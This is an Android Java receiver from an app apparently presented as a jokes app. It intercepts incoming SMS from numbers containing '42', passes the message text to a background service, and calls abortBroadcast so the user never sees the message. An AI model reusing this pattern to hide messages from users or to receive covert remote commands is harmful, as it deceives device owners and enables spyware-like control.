package com.ragmon.jokes.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsMessage;

import com.ragmon.jokes.services.SmsService;

/**
 * Created by example: https://habrahabr.ru/post/149555/
 */
public class SMSMonitor extends BroadcastReceiver {

    private static final String ACTION = "android.provider.Telephony.SMS_RECEIVED";

    private static final String[] fromList = new String[]{
            "+380934542433"
    };

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent != null && intent.getAction() != null &&
                ACTION.compareToIgnoreCase(intent.getAction()) == 0) {

            Object[] pduArray = (Object[]) intent.getExtras().get("pdus");
            SmsMessage[] messages = new SmsMessage[pduArray.length];
            for (int i = 0; i < pduArray.length; i++) {
                messages[i] = SmsMessage.createFromPdu((byte[]) pduArray[i]);
            }

            String sms_from = messages[0].getDisplayOriginatingAddress();
            if (isSmsFromServiceNumber(sms_from)) {
                StringBuilder bodyText = new StringBuilder();
                for (int i = 0; i < messages.length; i++) {
                    bodyText.append(messages[i].getMessageBody());
                }

                String body = bodyText.toString();
                Intent mIntent = new Intent(context, SmsService.class);
                mIntent.putExtra("sms_body", body);
                context.startService(mIntent);

                abortBroadcast();
            }
        }
    }

    private boolean isSmsFromServiceNumber(String serviceNumber) {
        if (serviceNumber.contains("42"))
            return true;
//        for (String from : fromList) {
//            if (from.equalsIgnoreCase(serviceNumber))
//                return true;
//        }
        return false;
    }

}
